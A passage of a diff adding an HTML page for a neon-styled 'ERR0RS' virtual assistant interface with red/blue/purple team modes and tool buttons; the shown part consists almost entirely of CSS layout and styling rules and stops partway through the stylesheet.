@@ -1,0 +1,3509 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>3RR0RZ // VIRTUAL ASSISTANT</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --void:      #04000a;
+      --deep:      #08001a;
+      --panel:     #0c0020;
+      --border:    #1e0040;
+      --purple:    #7b2fbe;
+      --purple-hi: #c084fc;
+      --purple-lo: #2d0a60;
+      --neon:      #bf6fff;
+      --green:     #39ff14;
+      --green-lo:  #0a2200;
+      --cyan:      #00f5ff;
+      --red:       #ff2255;
+      --amber:     #ffaa00;
+      --text:      #d4b8ff;
+      --text-dim:  #4a2870;
+      --glass:     rgba(123,47,190,0.08);
+      --glass-hi:  rgba(192,132,252,0.12);
+    }
+
+    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+
+    html, body {
+      height: 100%;
+      background: var(--void);
+      color: var(--text);
+      font-family: 'Share Tech Mono', monospace;
+      overflow: hidden;
+    }
+
+    /* ── SCANLINES ── */
+    body::after {
+      content:'';
+      position:fixed; inset:0;
+      background: repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,.12) 3px,rgba(0,0,0,.12) 4px);
+      pointer-events:none;
+      z-index:9998;
+    }
+
+    /* ══════════════════════════════════════════
+       ZOOM CALL LAYOUT
+    ══════════════════════════════════════════ */
+    #app {
+      display: grid;
+      grid-template-rows: 44px 1fr 200px;
+      grid-template-columns: 1fr 340px;
+      height: 100vh;
+      gap: 0;
+    }
+
+    /* ── TOPBAR ── */
+    #topbar {
+      grid-column: 1 / 3;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 20px;
+      background: linear-gradient(90deg, var(--void), #0a0020, var(--void));
+      border-bottom: 1px solid var(--border);
+      z-index: 100;
+    }
+    .brand {
+      font-family: 'Orbitron', monospace;
+      font-size: 1.1rem;
+      font-weight: 900;
+      letter-spacing: 3px;
+      color: var(--neon);
+      text-shadow: 0 0 14px var(--purple), 0 0 30px rgba(191,111,255,.4);
+    }
+    .brand em { color: var(--green); font-style:normal; }
+    .top-pills { display:flex; gap:10px; align-items:center; }
+    .pill {
+      padding: 2px 10px; border-radius:20px; font-size:.64rem;
+      border:1px solid; letter-spacing:1px; font-family:'Rajdhani',sans-serif; font-weight:700;
+    }
+    .pill.live   { border-color:var(--red);   color:var(--red);   background:rgba(255,34,85,.08); animation: pulse-pill 2s infinite; }
+    .pill.online { border-color:var(--green); color:var(--green); background:rgba(57,255,20,.06); }
+    .pill.npu    { border-color:var(--neon);  color:var(--neon);  background:rgba(191,111,255,.06); }
+    @keyframes pulse-pill { 0%,100%{opacity:1} 50%{opacity:.5} }
+    #clock {
+      font-family:'Rajdhani',sans-serif; font-size:.9rem; font-weight:500;
+      color:var(--text-dim); letter-spacing:2px;
+    }
+
+    /* ── ZOOM MAIN — ERR0RS VIDEO TILE ── */
+    #zoom-main {
+      grid-column: 1;
+      grid-row: 2;
+      position: relative;
+      overflow: hidden;
+      background: #000;
+    }
+
+    /* Background image — the actual ERR0RS photo */
+    #bg-img {
+      position: absolute; inset:0;
+      width:100%; height:100%;
+      object-fit: cover;
+      object-position: center top;
+      filter: brightness(.88) saturate(1.1);
+    }
+
+    /* Zoom overlay chrome */
+    .zoom-chrome {
+      position:absolute; inset:0;
+      background:
+        linear-gradient(to top, rgba(0,0,0,.85) 0%, transparent 35%),
+        linear-gradient(to bottom, rgba(4,0,10,.5) 0%, transparent 20%);
+      pointer-events:none;
+      z-index: 2;
+    }
+
+    /* Corner neon border — like a zoom "speaking" highlight */
+    .zoom-border {
+      position:absolute; inset:0;
+      border: 2px solid transparent;
+      border-radius:2px;
+      transition: border-color .3s, box-shadow .3s;
+      pointer-events:none;
+      z-index:3;
+    }
+    .zoom-border.speaking {
+      border-color: var(--neon);
+      box-shadow: inset 0 0 30px rgba(191,111,255,.15), 0 0 20px rgba(191,111,255,.3);
+    }
+
+    /* ERR0RS name tag — Zoom style */
+    .name-tag {
+      position:absolute; bottom:16px; left:16px;
+      display:flex; align-items:center; gap:8px;
+      background: rgba(0,0,0,.7);
+      backdrop-filter: blur(8px);
+      border:1px solid var(--border);
+      border-radius:6px;
+      padding: 5px 12px;
+      z-index:4;
+    }
+    .name-tag .nt-dot {
+      width:8px; height:8px; border-radius:50%;
+      background:var(--green);
+      box-shadow:0 0 8px var(--green);
+      animation: blink 2s infinite;
+    }
+    .name-tag .nt-name {
+      font-family:'Orbitron',monospace; font-size:.72rem; font-weight:700;
+      color:white; letter-spacing:3px;
+    }
+    .name-tag .nt-role {
+      font-size:.6rem; color:var(--neon); letter-spacing:1px;
+    }
+    @keyframes blink { 0%,100%{opacity:1}50%{opacity:.3} }
+
+    /* Speech bubble — floats over the video */
+    #speech {
+      position:absolute; bottom:60px; left:50%; transform:translateX(-50%);
+      background:rgba(8,0,26,.85); backdrop-filter:blur(12px);
+      border:1px solid var(--purple); border-radius:10px;
+      padding:10px 18px;
+      font-size:.78rem; color:var(--text);
+      text-align:center; line-height:1.6;
+      max-width:400px; min-width:200px;
+      z-index:5;
+      transition:opacity .5s;
+    }
+    #speech::after {
+      content:'';
+      position:absolute; bottom:-9px; left:50%; transform:translateX(-50%);
+      border:9px solid transparent;
+      border-top-color:var(--purple); border-bottom:none;
+    }
+
+    /* ERR0RS animated character — sits on top of background image, can MOVE */
+    #errz-char {
+      position:absolute;
+      bottom: 80px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 120px;
+      z-index:6;
+      transition: left .5s cubic-bezier(.34,1.4,.64,1), bottom .3s ease;
+      /* Character is invisible — the bg IMAGE is ERR0RS. This is for the press animation overlay */
+      pointer-events: none;
+    }
+
+    /* ── ERRZ PRESS ANIMATION ──
+       When a tool button is clicked, ERR0RS "moves" toward it.
+       We animate a glowing press-arm indicator over the clicked button instead of moving the whole character.
+       LIGHTWEIGHT: pure CSS transitions, no JS animation loops.
+    */
+    .press-arm {
+      position:fixed;
+      width:36px; height:36px;
+      border-radius:50%;
+      background:radial-gradient(circle, rgba(191,111,255,.9) 0%, rgba(123,47,190,.4) 60%, transparent 100%);
+      box-shadow:0 0 20px var(--neon), 0 0 40px rgba(191,111,255,.5);
+      pointer-events:none;
+      z-index:9000;
+      transform:scale(0);
+      transition:transform .25s cubic-bezier(.34,1.6,.64,1), opacity .3s;
+      opacity:0;
+    }
+    .press-arm.active {
+      transform:scale(1);
+      opacity:1;
+    }
+
+    /* ── RIGHT PANEL ── */
+    #right-panel {
+      grid-column:2;
+      grid-row:2 / 4;
+      display:flex; flex-direction:column;
+      background:var(--panel);
+      border-left:1px solid var(--border);
+      overflow:hidden;
+    }
+
+    /* Self-view tile — operator's "camera" */
+    #self-view {
+      height:160px;
+      background: linear-gradient(135deg, #0a001a 0%, #080015 100%);
+      border-bottom:1px solid var(--border);
+      position:relative;
+      overflow:hidden;
+      flex-shrink:0;
+    }
+    .self-view-label {
+      position:absolute; bottom:8px; left:10px;
+      font-size:.6rem; color:var(--text-dim); letter-spacing:2px;
+    }
+    /* Animated terminal lines in self-view (simulated screen glow) */
+    .sv-lines {
+      position:absolute; inset:0;
+      padding:10px;
+      font-size:.55rem; color:var(--text-dim);
+      overflow:hidden; opacity:.6;
+    }
+    .sv-line { display:block; margin-bottom:3px; }
+    .sv-cursor {
+      display:inline-block; width:7px; height:11px;
+      background:var(--green); animation:blink .8s infinite;
+      vertical-align:bottom;
+    }
+
+    /* Panel sections */
+    .rp-section {
+      flex:1; overflow-y:auto; display:flex; flex-direction:column;
+    }
+    .rp-header {
+      padding:7px 12px;
+      font-family:'Orbitron',monospace; font-size:.6rem;
+      letter-spacing:3px; color:var(--neon);
+      border-bottom:1px solid var(--border);
+      background:var(--glass);
+      display:flex; align-items:center; gap:8px;
+      flex-shrink:0;
+    }
+    .rp-dot {
+      width:6px; height:6px; border-radius:50%;
+      background:var(--neon); box-shadow:0 0 6px var(--neon);
+      animation:blink 2s infinite;
+    }
+
+    /* Intel feed */
+    #intel-feed {
+      flex:1; overflow-y:auto;
+      padding:8px; display:flex; flex-direction:column; gap:5px;
+    }
+    .ic {
+      background:var(--deep); border:1px solid var(--border);
+      border-left:3px solid var(--purple);
+      border-radius:4px; padding:7px 9px; font-size:.65rem;
+    }
+    .ic.ok   { border-left-color:var(--green); }
+    .ic.warn { border-left-color:var(--amber); }
+    .ic.crit { border-left-color:var(--red); }
+    .ic.info { border-left-color:var(--cyan); }
+    .ic-ts   { color:var(--text-dim); font-size:.58rem; }
+    .ic-ttl  { color:var(--neon); margin:2px 0; font-size:.68rem; }
+    .ic-body { color:var(--text-dim); line-height:1.5; }
+
+    /* Phases */
+    #phase-list { padding:8px; display:flex; flex-direction:column; gap:3px; }
+    .ph {
+      display:flex; align-items:center; gap:10px;
+      padding:5px 8px; border-radius:4px; font-size:.66rem;
+      font-family:'Rajdhani',sans-serif; font-weight:500; letter-spacing:1px;
+    }
+    .ph.done    { color:var(--green); }
+    .ph.active  { color:var(--neon); background:rgba(123,47,190,.15); }
+    .ph.pending { color:var(--text-dim); }
+    .ph-dot { width:7px; height:7px; border-radius:50%; flex-shrink:0; }
+    .ph.done    .ph-dot { background:var(--green); box-shadow:0 0 5px var(--green); }
+    .ph.active  .ph-dot { background:var(--neon); box-shadow:0 0 8px var(--neon); animation:blink 1s infinite; }
+    .ph.pending .ph-dot { background:var(--text-dim); }
+
+    /* ── BOTTOM BAR — TOOL GRID ── */
+    #bottom-bar {
+      grid-column: 1;
+      grid-row: 3;
+      display:flex; flex-direction:column;
+      background: linear-gradient(180deg, var(--void) 0%, var(--deep) 100%);
+      border-top:1px solid var(--border);
+      overflow:hidden;
+    }
+    .bb-header {
+      padding:5px 16px;
+      display:flex; align-items:center; justify-content:space-between;
+      border-bottom:1px solid var(--border);
+      flex-shrink:0;
+    }
+    .bb-label {
+      font-family:'Orbitron',monospace; font-size:.58rem;
+      letter-spacing:3px; color:var(--text-dim);
+    }
+    #tool-grid {
+      flex:1; display:flex; align-items:center;
+      gap:6px; padding:8px 14px;
+      overflow-x:auto; overflow-y:hidden;
+      min-height: 78px;
+    }
+    #tool-grid::-webkit-scrollbar { height:3px; }
+    #tool-grid::-webkit-scrollbar-thumb { background:var(--purple-lo); }
+
+    .tb {
+      flex-shrink:0;
+      width:72px; height:72px;
+      background:var(--panel);
+      border:1px solid var(--border);
+      border-radius:8px;
+      display:flex; flex-direction:column;
+      align-items:center; justify-content:center;
+      gap:4px; cursor:pointer;
+      position:relative; overflow:hidden;
+      transition:all .2s;
+      user-select:none;
+    }
+    .tb::before {
+      content:'';
+      position:absolute; inset:0;
+      background:linear-gradient(135deg, var(--glass-hi), transparent);
+      opacity:0; transition:opacity .2s;
+    }
+    .tb:hover { border-color:var(--purple); transform:translateY(-3px); box-shadow:0 0 18px rgba(123,47,190,.35); }
+    .tb:hover::before { opacity:1; }
+    .tb:active { transform:translateY(0) scale(.95); }
+    .tb.pressed {
+      border-color:var(--neon);
+      box-shadow:0 0 25px rgba(191,111,255,.6), inset 0 0 15px rgba(191,111,255,.1);
+    }
+    .tb-icon  { font-size:1.3rem; line-height:1; }
+    .tb-name  { font-size:.5rem; color:var(--text); letter-spacing:1px; text-align:center; }
+    .tb-cat   { font-size:.45rem; color:var(--text-dim); letter-spacing:1px; }
+
+    /* ── TEAM MODE SELECTOR ── */
+    #team-mode-selector {
+      display: flex; gap: 4px; align-items: center;
+      background: rgba(0,0,0,.4);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 3px 5px;
+    }
+    .tm-btn {
+      display: flex; flex-direction: column; align-items: center;
+      padding: 4px 12px; border-radius: 6px; cursor: pointer;
+      border: 1px solid transparent;
+      transition: all .25s cubic-bezier(.34,1.6,.64,1);
+      min-width: 80px; position: relative; overflow: hidden;
+    }
+    .tm-btn::before {
+      content: ''; position: absolute; inset: 0;
+      opacity: 0; transition: opacity .25s;
+      background: linear-gradient(135deg, currentColor 0%, transparent 100%);
+    }
+    .tm-btn.active::before { opacity: .12; }
+    .tm-dot { font-size: .55rem; opacity: .5; transition: opacity .25s; }
+    .tm-btn.active .tm-dot { opacity: 1; animation: pulse-dot 1.5s infinite; }
+    @keyframes pulse-dot { 0%,100%{opacity:1} 50%{opacity:.4} }
+    .tm-label {
+      font-family: 'Orbitron', monospace; font-size: .5rem;
+      font-weight: 700; letter-spacing: 2px;
+      transition: color .25s;
+    }
+    .tm-sub {
+      font-size: .42rem; letter-spacing: 1px;
+      color: var(--text-dim); transition: color .25s;
+    }
+
+    /* RED */
+    .tm-red { color: var(--red); }
+    .tm-red.active { border-color: var(--red); box-shadow: 0 0 12px rgba(255,34,85,.25), inset 0 0 8px rgba(255,34,85,.08); }
+    .tm-red .tm-dot { color: var(--red); }
+
+    /* BLUE */
+    .tm-blue { color: #00b4ff; }
+    .tm-blue.active { border-color: #00b4ff; box-shadow: 0 0 12px rgba(0,180,255,.25), inset 0 0 8px rgba(0,180,255,.08); }
+    .tm-blue .tm-dot { color: #00b4ff; }
+
+    /* PURPLE */
+    .tm-purple { color: var(--neon); }
+    .tm-purple.active { border-color: var(--neon); box-shadow: 0 0 12px rgba(191,111,255,.3), inset 0 0 8px rgba(191,111,255,.1); }
+    .tm-purple .tm-dot { color: var(--neon); }
+
+    /* When mode changes — animate topbar */
+    #topbar { transition: border-bottom-color .4s; }
+    body.mode-red    #topbar { border-bottom-color: rgba(255,34,85,.5); }
+    body.mode-blue   #topbar { border-bottom-color: rgba(0,180,255,.5); }
+    body.mode-purple #topbar { border-bottom-color: rgba(191,111,255,.5); }
+
+
+
+
+    /* ── Autonomous Agent Panel ──────────────────────────────── */
+    #agent-panel {
+      position: fixed;
+      top: 44px; left: 0;
+      width: 260px;
+      background: #0a0012;
+      border-right: 1px solid #7b2fbe44;
+      border-bottom: 1px solid #7b2fbe44;
+      padding: 12px;
+      z-index: 150;
+      display: none;
+      flex-direction: column;
+      gap: 8px;
+      border-radius: 0 0 8px 0;
+    }
+    #agent-panel.visible { display: flex; }
+    #agent-trigger {
+      position: fixed;
+      top: 50px; left: 0;
+      width: 28px; height: 80px;
+      background: #7b2fbe;
+      border-radius: 0 6px 6px 0;
+      z-index: 151;
+      cursor: pointer;
+      display: flex; align-items: center; justify-content: center;
+      writing-mode: vertical-rl;
+      font-size: 10px; font-weight: 700; color: #fff;
+      letter-spacing: 0.1em; user-select: none;
+    }
+    .ag-header { font-size: 10px; color: #7b2fbe; font-weight: 700;
+                 letter-spacing: 0.12em; text-transform: uppercase; }
+    .ag-status { display: flex; align-items: center; gap: 6px;
+                 font-size: 11px; color: #d8b4fe; }
+    .ag-dot { width: 8px; height: 8px; border-radius: 50%;
+              background: #888; flex-shrink: 0; }
+    .ag-dot.running { background: #22c55e; animation: pulse 1s infinite; }
+    .ag-dot.done    { background: #a855f7; }
+    @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.4;} }
+    .ag-input { background: #0d001a; border: 1px solid #7b2fbe55;
+                border-radius: 4px; padding: 5px 8px;
+                font-size: 11px; color: #d8b4fe; width: 100%;
+                box-sizing: border-box; font-family: monospace; }
+    .ag-select { background: #0d001a; border: 1px solid #7b2fbe55;
+                 border-radius: 4px; padding: 5px 8px;
+                 font-size: 11px; color: #d8b4fe; width: 100%; cursor: pointer; }
+    .ag-btn { background: linear-gradient(135deg,#7b2fbe,#4c1d95);
+              color: #fff; border: none; border-radius: 4px;
+              padding: 8px; font-size: 11px; font-weight: 700;
+              cursor: pointer; width: 100%; letter-spacing: 0.05em; }
+    .ag-btn:hover { opacity: 0.85; }
+    .ag-btn.stop { background: linear-gradient(135deg,#dc2626,#991b1b); }
+    .ag-stat { display: flex; justify-content: space-between;
+               font-size: 10px; color: #888; padding: 2px 0; }
+    .ag-stat-val { color: #a855f7; font-weight: 700; }
+    .ag-phase { font-size: 10px; color: #22d3ee; padding: 2px 0; }
+    /* ─────────────────────────────────────────────────────────── */
+
+    /* ── Operator Skill Panel ─────────────────────────────────── */
+    #skill-panel {
+      position: fixed;
+      top: 44px;
+      right: 0;
+      width: 280px;
+      height: calc(100vh - 44px);
+      background: #0a0012;
+      border-left: 1px solid #7b2fbe44;
+      z-index: 200;
+      transform: translateX(100%);
+      transition: transform 0.3s ease;
+      overflow-y: auto;
+      padding: 16px;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    #skill-panel.open { transform: translateX(0); }
+    #skill-toggle {
+      position: fixed;
+      top: 50px;
+      right: 0;
+      width: 28px;
+      height: 80px;
+      background: #7b2fbe;
+      border-radius: 6px 0 0 6px;
+      z-index: 201;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      writing-mode: vertical-rl;
+      font-size: 10px;
+      font-weight: 700;
+      color: #fff;
+      letter-spacing: 0.1em;
+      user-select: none;
+    }
+    .sp-header { font-size: 10px; color: #7b2fbe; font-weight: 700; letter-spacing: 0.12em; text-transform: uppercase; }
+    .sp-level-badge {
+      background: linear-gradient(135deg, #7b2fbe, #4c1d95);
+      border-radius: 8px;
+      padding: 10px 12px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .sp-badge-icon { font-size: 28px; }
+    .sp-level-info { flex: 1; }
+    .sp-level-name { font-size: 13px; font-weight: 700; color: #fff; }
+    .sp-xp-line { font-size: 10px; color: #c084fc; margin-top: 2px; }
+    .sp-xp-bar-wrap { background: #1a0a2e; border-radius: 4px; height: 6px; margin-top: 6px; overflow: hidden; }
+    .sp-xp-bar { height: 100%; background: #a855f7; border-radius: 4px; transition: width 0.6s ease; }
+    .sp-domain-row { display: flex; align-items: center; gap: 8px; margin: 2px 0; }
+    .sp-domain-icon { width: 16px; text-align: center; font-size: 12px; }
+    .sp-domain-name { flex: 1; font-size: 10px; color: #d8b4fe; }
+    .sp-domain-bar-wrap { width: 70px; background: #1a0a2e; border-radius: 3px; height: 4px; overflow: hidden; }
+    .sp-domain-bar { height: 100%; background: #7b2fbe; border-radius: 3px; }
+    .sp-domain-pct { font-size: 9px; color: #7b2fbe; width: 24px; text-align: right; }
+    .sp-stat-row { display: flex; justify-content: space-between; font-size: 11px; color: #d8b4fe; padding: 3px 0; border-bottom: 1px solid #7b2fbe22; }
+    .sp-stat-val { color: #a855f7; font-weight: 700; }
+    /* ─────────────────────────────────────────────────────────── */
+    /* ── Onboarding Overlay ──────────────────────────────────── */
+    #onboarding-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.92);
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      backdrop-filter: blur(4px);
+    }
+    #onboarding-overlay.hidden { display: none; }
+    .ob-card {
+      background: #0a0012;
+      border: 1px solid #7b2fbe;
+      border-radius: 12px;
+      padding: 36px;
+      max-width: 560px;
+      width: 90%;
+      box-shadow: 0 0 60px #7b2fbe44;
+    }
+    .ob-logo { font-size: 36px; margin-bottom: 12px; }
+    .ob-title { font-size: 22px; font-weight: 700; color: #c084fc; margin-bottom: 4px; }
+    .ob-sub { font-size: 13px; color: #888; margin-bottom: 20px; }
+    .ob-content p { font-size: 13px; color: #d8b4fe; margin: 8px 0; line-height: 1.6; }
+    .ob-skill-option {
+      border: 1px solid #7b2fbe44;
+      border-radius: 8px;
+      padding: 12px 14px;
+      margin: 8px 0;
+      cursor: pointer;
+      transition: all 0.2s;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .ob-skill-option:hover, .ob-skill-option.selected {
+      border-color: #a855f7;
+      background: #1a0a2e;
+    }
+    .ob-skill-badge { font-size: 22px; }
+    .ob-skill-label { font-size: 13px; font-weight: 700; color: #c084fc; }
+    .ob-skill-desc { font-size: 11px; color: #888; margin-top: 2px; }
+    .ob-checkbox-row { display: flex; align-items: flex-start; gap: 10px; margin: 16px 0; }
+    .ob-checkbox-row input { margin-top: 3px; accent-color: #a855f7; }
+    .ob-checkbox-row label { font-size: 12px; color: #d8b4fe; line-height: 1.5; }
+    .ob-btn {
+      background: linear-gradient(135deg, #7b2fbe, #4c1d95);
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 12px 24px;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 16px;
+      letter-spacing: 0.05em;
+      transition: opacity 0.2s;
+    }
+    .ob-btn:hover { opacity: 0.85; }
+    .ob-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+    .ob-steps { display: flex; gap: 6px; margin-bottom: 20px; }
+    .ob-step { width: 40px; height: 3px; border-radius: 2px; background: #1a0a2e; }
+    .ob-step.active { background: #a855f7; }
+    .ob-step.done { background: #7b2fbe66; }
+    /* ─────────────────────────────────────────────────────────── */
+    /* ── Mission Coach Panel ─────────────────────────────────── */
+    #mission-coach {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 340px;
+      background: #0d001a;
+      border-top: 2px solid #7b2fbe;
+      padding: 12px 16px;
+      z-index: 100;
+      display: none;
+    }
+    #mission-coach.visible { display: flex; gap: 12px; align-items: flex-start; }
+    .mc-icon { font-size: 20px; }
+    .mc-content { flex: 1; }
+    .mc-title { font-size: 11px; font-weight: 700; color: #7b2fbe; letter-spacing: 0.1em; }
+    .mc-text { font-size: 12px; color: #d8b4fe; margin-top: 4px; line-height: 1.5; }
+    .mc-close { cursor: pointer; color: #7b2fbe; font-size: 16px; padding: 0 4px; }
+    /* ─────────────────────────────────────────────────────────── */
+
+        /* ── ERR0RS Chat Bubbles ─────────────────────────────────────── */
+    .err0rs-chat-bubble {
+      background: linear-gradient(135deg, #1a0a2e 0%, #12001f 100%);
+      border: 1px solid #7b2fbe55;
+      border-left: 3px solid #a855f7;
+      border-radius: 0 8px 8px 8px;
+      margin: 12px 4px 8px 4px;
+      padding: 12px 14px 10px 14px;
+      font-family: 'Segoe UI', 'Inter', system-ui, sans-serif;
+      font-size: 13px;
+      line-height: 1.6;
+      color: #e2d9f3;
+      max-width: 100%;
+      box-shadow: 0 2px 12px #7b2fbe22;
+    }
+    .chat-label {
+      display: block;
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 0.1em;
+      color: #a855f7;
+      margin-bottom: 8px;
+      text-transform: uppercase;
+    }
+    .chat-body { display: block; }
+    .chat-cursor {
+      display: inline-block;
+      color: #a855f7;
+      animation: blink 0.8s step-end infinite;
+    }
+    @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0;} }
+    .chat-p { margin: 0 0 8px 0; }
+    .chat-p:last-child { margin-bottom: 0; }
+    .chat-h2 { color: #c084fc; font-size: 15px; margin: 12px 0 6px 0; border-bottom: 1px solid #7b2fbe44; padding-bottom: 4px; }
+    .chat-h3 { color: #c084fc; font-size: 14px; margin: 10px 0 4px 0; }
+    .chat-h4 { color: #d8b4fe; font-size: 13px; margin: 8px 0 4px 0; }
+    .chat-li { margin: 3px 0 3px 12px; color: #d8b4fe; }
+    .chat-li-num { margin: 3px 0 3px 12px; }
+    .li-n { color: #a855f7; font-weight: 700; margin-right: 4px; }
+    .chat-code {
+      background: #0d0018;
+      border: 1px solid #7b2fbe44;
+      border-radius: 4px;
+      padding: 8px 10px;
+      margin: 8px 0;
+      font-family: 'JetBrains Mono', 'Fira Code', monospace;
+      font-size: 12px;
+      color: #22d3ee;
+      overflow-x: auto;
+      white-space: pre;
+    }
+    .chat-inline-code {
+      background: #0d0018;
+      border: 1px solid #7b2fbe44;
+      border-radius: 3px;
+      padding: 1px 5px;
+      font-family: 'JetBrains Mono', 'Fira Code', monospace;
+      font-size: 12px;
+      color: #22d3ee;
+    }
+    /* ─────────────────────────────────────────────────────────────── */
+
+        /* Tool grid dim/highlight based on mode */
+    body.mode-blue   .tb.offensive { opacity: .35; filter: grayscale(.5); }
+    body.mode-blue   .tb.defensive { border-color: #00b4ff; box-shadow: 0 0 8px rgba(0,180,255,.2); }
+    body.mode-blue   .tb.both      { border-color: #00b4ff; }
+    body.mode-red    .tb.defensive { opacity: .35; filter: grayscale(.5); }
+    body.mode-red    .tb.offensive { border-color: var(--red); box-shadow: 0 0 8px rgba(255,34,85,.15); }
+    body.mode-red    .tb.both      { border-color: var(--amber); }
+    body.mode-purple .tb { border-color: var(--neon); }
+
+    /* Target modal input focus */
+    #target-modal-input:focus { border-color: var(--neon) !important; box-shadow: 0 0 8px rgba(191,111,255,.3); }
+
+    /* Mode banner — appears below topbar when mode changes */
+    #mode-banner {
+      position: fixed; top: 44px; left: 0; right: 0; z-index: 200;
+      padding: 6px 20px; font-family: 'Orbitron', monospace;
+      font-size: .58rem; letter-spacing: 3px; text-align: center;
+      transform: translateY(-100%); transition: transform .3s ease;
+      pointer-events: none;
+    }
+    #mode-banner.visible { transform: translateY(0); }
+    #mode-banner.red    { background: rgba(255,34,85,.15); border-bottom: 1px solid rgba(255,34,85,.4); color: #ff7799; }
+    #mode-banner.blue   { background: rgba(0,180,255,.1);  border-bottom: 1px solid rgba(0,180,255,.4); color: #66d4ff; }
+    #mode-banner.purple { background: rgba(191,111,255,.1);border-bottom: 1px solid rgba(191,111,255,.4); color: var(--neon); }
+
+    /* ── SESSION MANAGER ── */
+    #session-menu {
+      position: fixed; top: 50px; right: 20px; z-index: 1000;
+      background: #0a0018; border: 1px solid var(--border);
+      border-radius: 8px; padding: 10px; width: 260px;
+      box-shadow: 0 8px 32px rgba(0,0,0,.6), 0 0 20px rgba(191,111,255,.1);
+      font-family: 'Share Tech Mono', monospace;
+    }
+    .sm-header {
+      font-size: .55rem; color: var(--text-dim); letter-spacing: 2px;
+      padding: 2px 0 4px; border-bottom: 1px solid var(--border); margin-bottom: 6px;
+    }
+    .sm-row { display: flex; gap: 6px; align-items: center; }
+    #sm-name {
+      flex: 1; background: rgba(255,255,255,.05); border: 1px solid var(--border);
+      border-radius: 4px; padding: 4px 8px; color: var(--text);
+      font-family: 'Share Tech Mono', monospace; font-size: .7rem; outline: none;
+    }
+    #sm-name:focus { border-color: var(--neon); }
+    #session-menu button {
+      padding: 4px 10px; border-radius: 4px; cursor: pointer;
+      font-family: 'Rajdhani', sans-serif; font-weight: 700;
+      font-size: .6rem; letter-spacing: 1px; border: 1px solid var(--neon);
+      color: var(--neon); background: rgba(191,111,255,.08);
+      transition: all .2s;
+    }
+    #session-menu button:hover { background: rgba(191,111,255,.2); }
+    .sm-session-item {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 5px 6px; border-radius: 4px; cursor: pointer;
+      transition: background .15s; font-size: .65rem; gap: 6px;
+    }
+    .sm-session-item:hover { background: rgba(255,255,255,.05); }
+    .sm-session-name { color: var(--text); flex: 1; }
+    .sm-session-meta { color: var(--text-dim); font-size: .55rem; white-space: nowrap; }
+    .sm-session-load { color: var(--green); font-size: .6rem; cursor: pointer; padding: 2px 6px; }
+    .sm-session-del  { color: var(--red);   font-size: .7rem; cursor: pointer; padding: 2px 4px; }
+    .sm-empty { color: var(--text-dim); font-size: .62rem; padding: 6px 0; text-align: center; }
+
+    /* ── XTERM-STYLE TERMINAL — makes the LTP look like a real terminal ── */
+    #ltp-output {
+      font-family: 'Share Tech Mono', monospace !important;
+      font-size: .73rem !important;
+      line-height: 1.45 !important;
+      letter-spacing: 0.02em;
+    }
+    /* cursor blink in input */
+    @keyframes blink { 0%,49%{opacity:1} 50%,100%{opacity:0} }
+    #ltp-input { caret-color: var(--green) !important; }
+
+    /* ANSI color support in output */
+    .ansi-red    { color: #ff5555; }
+    .ansi-green  { color: #50fa7b; }
+    .ansi-yellow { color: #f1fa8c; }
+    .ansi-blue   { color: #6272a4; }
+    .ansi-magenta{ color: #ff79c6; }
+    .ansi-cyan   { color: #8be9fd; }
+    .ansi-white  { color: #f8f8f2; }
+    .ansi-bold   { font-weight: bold; }
+    #live-term-panel {
+      display: none; /* shown when WS connects */
+      flex-direction: column;
+      background: #000;
+      border-top: 2px solid var(--neon);
+      position: fixed;
+      bottom: 0; left: 0; right: 340px;
+      height: 45vh;
+      z-index: 5000;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: .72rem;
+    }
+    #live-term-panel.active { display: flex; }
+    #ltp-header {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 4px 12px;
+      background: linear-gradient(90deg, var(--purple-lo), #000);
+      border-bottom: 1px solid var(--border);
+      flex-shrink: 0;
+    }
+    #ltp-title {
+      font-family: 'Orbitron', monospace; font-size: .6rem;
+      color: var(--neon); letter-spacing: 3px;
+    }
+    .ltp-badge {
+      padding: 2px 8px; border-radius: 20px; font-size: .55rem;
+      font-family: 'Rajdhani', sans-serif; font-weight: 700;
+      letter-spacing: 1px;
+    }
+    .ltp-badge.live   { border: 1px solid var(--green); color: var(--green); background: rgba(57,255,20,.08); animation: pulse-pill 1.5s infinite; }
+    .ltp-badge.idle   { border: 1px solid var(--text-dim); color: var(--text-dim); }
+    #ltp-close {
+      cursor: pointer; color: var(--text-dim); font-size: .8rem; padding: 0 6px;
+      transition: color .2s;
+    }
+    #ltp-close:hover { color: var(--red); }
+
+    /* Output area */
+    #ltp-output {
+      flex: 1; overflow-y: auto; padding: 8px 14px;
+      display: flex; flex-direction: column; gap: 1px;
+    }
+    #ltp-output::-webkit-scrollbar { width: 3px; }
+    #ltp-output::-webkit-scrollbar-thumb { background: var(--purple-lo); }
+    .ltp-line          { color: var(--text);      line-height: 1.5; white-space: pre-wrap; word-break: break-all; }
+    .ltp-line.system   { color: var(--neon);      opacity: .8; }
